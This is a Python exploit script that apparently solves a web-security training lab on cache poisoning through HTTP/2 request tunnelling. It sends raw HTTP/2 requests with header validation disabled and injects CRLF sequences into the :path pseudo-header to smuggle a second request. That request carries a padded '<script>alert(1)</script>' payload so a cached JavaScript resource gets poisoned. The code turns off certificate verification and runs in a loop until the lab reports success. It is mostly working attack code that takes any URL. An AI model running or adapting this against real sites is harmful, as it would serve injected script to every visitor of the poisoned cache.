# Web cache poisoning via HTTP/2 request tunnelling

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
import h2.config
import h2.connection

TIMEOUT = 14

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def format_h2_headers(method, path, host, headers=None, header_list=None):
	request_headers = [
	(b":scheme", b"https"),
	(b":method", method.encode()),
	(b":path", path.encode()),
	(b":authority", host.encode())
	]
	if headers:
		headers = headers.splitlines()
		for d in headers:
			name, value = d.split(':')
			request_headers.append((name.strip().encode(), value.strip().encode()))
	if header_list:
		request_headers += header_list
	return request_headers

def format_body(body):
	return re.sub(r"(?<!\r)\n", "\r\n", body).encode()

def send_h2_request(host, request_headers, request_content=None, port=443):
	if request_content:
		if type(request_content) == str:
			request_content = request_content.encode()
	socket.setdefaulttimeout(TIMEOUT)

	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	ctx.set_alpn_protocols(['h2'])
	
	sock = socket.create_connection((host, port))
	sock = ctx.wrap_socket(sock, server_hostname=host)
	
	config = h2.config.H2Configuration(validate_outbound_headers=False, normalize_outbound_headers=False)
	conn = h2.connection.H2Connection(config=config)
	conn.initiate_connection()
	sock.sendall(conn.data_to_send())
	
	if request_content:
		conn.send_headers(1, request_headers)
		conn.send_data(1, request_content, end_stream=True)
	else:
		conn.send_headers(1, request_headers, end_stream=True)
	sock.sendall(conn.data_to_send())

	body = b""
	response_end = False
	try:
		while not response_end:
			try:
				data = sock.recv(65536 * 1024)
			except socket.timeout:
				socket_timeout = True
				break
			if not data:
				break
			try:
				events = conn.receive_data(data)
			except Exception:
				error_code = "Error"
			if events:
				for event in events:
					if isinstance(event, h2.events.ConnectionTerminated):
						error_code = event.error_code
					elif isinstance(event, h2.events.ResponseReceived):
						response_headers = event.headers
					elif isinstance(event, h2.events.DataReceived):
						conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
						body += event.data
					elif isinstance(event, h2.events.StreamEnded):
						response_body = body
						response_end = True
						break
			sock.sendall(conn.data_to_send())
		conn.close_connection()
		sock.sendall(conn.data_to_send())
		sock.close()
	except socket.timeout:
		socket_timeout = True
	if "response_headers" not in locals():
		response_headers = ""
	if "response_body" not in locals():
		response_body = ""
	if "error_code" not in locals():
		error_code = ""
	if "socket_timeout" not in locals():
		socket_timeout = False
	result = {
	"response_headers": response_headers,
	"response_body": response_body,
	"error_code": error_code,
	"socket_timeout": socket_timeout
	}
	return result

def get_header(resp, header):
	for h in resp['response_headers']:
		if h[0] == header.encode():
			return h[1].decode()

def get_status_code(resp):
	for h in resp['response_headers']:
		if h[0] == b":status":
			return int(h[1].decode())

def get_cookie(resp):
	for h in resp['response_headers']:
		if h[0] == b"set-cookie":
			return h[1].decode().split(';')[0]

def get_length(resp):
	for h in resp['response_headers']:
		if h[0] == b"content-length":
			print('[+] Normal Content-Length:\t%s' % h[1].decode())
			return int(h[1].decode())

def reset_requests(url):
	for t in range(1, 11):
		sys.stdout.flush()
		time.sleep(.5)
		r = send_get_request(url, '/')
		status = get_status_code(r)
		sys.stdout.write('\r[+] Reseting response queue... %s\t=>\t%s' % (str(t), str(status)))
	print('\n')

def send_get_request(host, path):
	method = 'GET'
	headers = format_h2_headers(method, path, host)
	resp = send_h2_request(host, headers)
	return resp

def send_tunnelling_request(host, length, i):
	print('\n[+] Sending Tunnelling Request...')
	payload = "<script>alert(1)</script>"
	padding = "A" * length
	method = 'HEAD'
	path = f'/ HTTP/1.1\r\nHost: {host}\r\n\r\nGET /resources/js?{payload}{padding} HTTP/1.1\r\nFoo: bar'
	headers = format_h2_headers(method, path, host)
	if i == 1:
		print('[+] Using Pseudo-headers:\n\t%s' % headers)
	resp = send_h2_request(host, headers)
	print(str(get_status_code(resp)))
	return resp

def send_cachebuster_requests(host, length, post_id):
	time.sleep(2)
	print('\n[+] Sending Cachebuster Request #3...')
	payload = "<script>alert(1)</script>"
	padding = "A" * (length + 1)
	method = 'HEAD'
	path = f'/?cb=1 HTTP/1.1\r\nHost: {host}\r\n\r\nGET /resources/js?{payload}{padding} HTTP/1.1\r\nFoo: bar'
	headers = format_h2_headers(method, path, host)
	print('[+] Using Pseudo-headers:\n\t%s' % headers)
	resp = send_h2_request(host, headers)
	print(str(get_status_code(resp)))
	time.sleep(2)
	return resp

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Web cache poisoning via HTTP/2 request tunnelling')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		print('[+] Trying send HTTP Request Tunnelling attack...\n')
		time.sleep(1)
		parsed_url = urllib.parse.urlparse(url)
		print(parsed_url)
		subdomain = parsed_url.netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url.scheme == "http":
			port = 80
		url = parsed_url.scheme + '://' + subdomain
		print('[+] Getting Content-Length of a normal GET request...')		
		resp = send_get_request(subdomain, '/')
		status = get_status_code(resp)
		print(status)
		length = get_length(resp)
		solved = False
		post_id = 0
		while solved is False:
			if resp:
				if solved == False:
					reset_requests(subdomain)
				print('[+] Using Content-Length value as padding to build the payload...')
				time.sleep(1)
				send_cachebuster_requests(subdomain, length, post_id)
				for i in range(1, 9):
					time.sleep(1)
					resp = send_tunnelling_request(subdomain, length, i)
					status = get_status_code(resp)
					print(status)
					print(resp['response_headers'])
					if status == "200":
						if int(get_header(resp, 'content-length')) > length:
							print('WAIT...')
							time.sleep(5)
					time.sleep(TIMEOUT)
					r = s.get(url)
					print(r)
					if 'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved !')
						solved = True
						break

if __name__ == "__main__":
	main()
